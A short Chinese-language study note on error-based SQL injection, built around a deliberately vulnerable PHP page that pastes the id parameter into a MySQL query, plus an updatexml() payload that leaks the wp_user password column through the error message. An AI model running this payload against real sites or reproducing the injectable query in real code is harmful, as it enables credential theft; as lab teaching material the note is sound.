# blablabla

Error-Type Injection 利用报错信息获得隐私数据

```php
<?php
    $conn = mysqli_connect("localhost","root","kali","test");
    $res = mysqli_query($conn, "SELECT title, content FROM wp_news WHERE id='".$_GET['id']."'") OR VAR_DUMP(mysqli_error($conn));
    
    $row = mysqli_fetch_array($res);
    
    echo "<center>";

    echo "<h1>".$row['title']."</h1>";

    echo "<br>";
    
    echo "<h1>".$row['content']."</h1>";

    echo "</center>";
?>
```

?id=1 正常
?id=1%27 (1') 将会把输出内容替换成报错信息

- 没有报错信息而是白屏？

这和php.ini中关于报错的显示有关系，主要涉及到三个环境变量：`display_errors`，`display_startup_errors`和`reporting_error`。

将前两者设置为`On`(数值1)，

`reporting_error`设置为E_ALL即可（实际生产环境中也有其他设置的方法）

所以有的时候error_injection不一定成功，可能目标服务器将报错信息显示关闭，这也是解题时需要考虑的。

而测试环境中打个报错php然后var_dump测试一下就可以。

测试环境中用下面的代码加在php的最开头则可以强制设定环境变量（一次性）
```php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
```

利用这个报错信息我们可以获取许多敏感信息比如：

?id=1' or updatexml(1, concat(0x7e,(select pwd from wp_user)),1)--+

其中--+是MySql的注释符号，把多余的单引号注释掉（注意mariaDB版本）

输出信息：

```
Fatal error: Uncaught mysqli_sql_exception: XPATH syntax error: '~this_is_the_admin_password' in /var/www/html/sql3.php:7 Stack trace: #0 /var/www/html/sql3.php(7): mysqli_query() #1 {main} thrown in /var/www/html/sql3.php on line 7
```

可以看到报错信息竟然意外地给出了我们所查询的pwd~

updatexml()是MySQL的XML函数，如果参数不合法会报错，并把第二个参数内容输出到错误信息里，也正是利用这一点我们查询到了pwd的值（

```
UPDATEXML(xml_target, xpath_expr, new_value)
```

- xml_target：XML 文本。
- xpath_expr：XPath 表达式。
- new_value：用于替换的值。

通常只要 xpath_expr 非法，MySQL 就会报错并把 xpath_expr 的内容显示在错误信息中。

1显然不是合法的xml

（以下是知识补充）
XML（eXtensible Markup Language，可扩展标记语言）是一种用于结构化存储和传输数据的标记语言。它由W3C（万维网联盟）制定，设计目标是具有良好的可扩展性、可读性，并且易于人和机器理解。

（和html相近）